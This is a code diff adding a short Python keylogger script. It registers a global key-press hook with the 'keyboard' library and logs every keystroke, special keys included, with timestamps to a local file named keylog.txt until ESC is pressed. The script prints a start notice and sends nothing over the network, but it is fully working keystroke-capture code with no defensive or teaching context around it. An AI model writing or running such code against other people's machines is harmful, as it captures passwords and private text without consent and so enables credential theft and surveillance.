@@ -1,0 +1,49 @@
+import keyboard
+import logging
+from datetime import datetime
+import os
+
+# Define the path for the log file
+log_file_path = "keylog.txt"
+
+# Set up logging configuration
+logging.basicConfig(
+    filename=log_file_path,
+    level=logging.DEBUG,
+    format="%(asctime)s: %(message)s",
+)
+
+def on_key_event(event):
+    try:
+        # Capture the event name and timestamp
+        key = event.name
+        if len(key) > 1:
+            # Handle special keys (space, enter, etc.)
+            if key == "space":
+                key = " "
+            elif key == "enter":
+                key = "[ENTER]\n"
+            elif key == "tab":
+                key = "[TAB]"
+            elif key == "backspace":
+                key = "[BACKSPACE]"
+            elif key == "esc":
+                key = "[ESC]"
+            else:
+                key = f"[{key.upper()}]"
+        
+        logging.info(key)
+    except Exception as e:
+        logging.error(f"Error in on_key_event: {str(e)}")
+
+# Register the event listener for key presses
+keyboard.on_press(on_key_event)
+
+# Inform the user that the keylogger has started
+print("Keylogger started... Press 'ESC' to stop.")
+
+# Keep the program running and listen for the 'esc' key to stop
+keyboard.wait('esc')
+
+# Inform the user that the keylogger has stopped
+print("Keylogger stopped.")
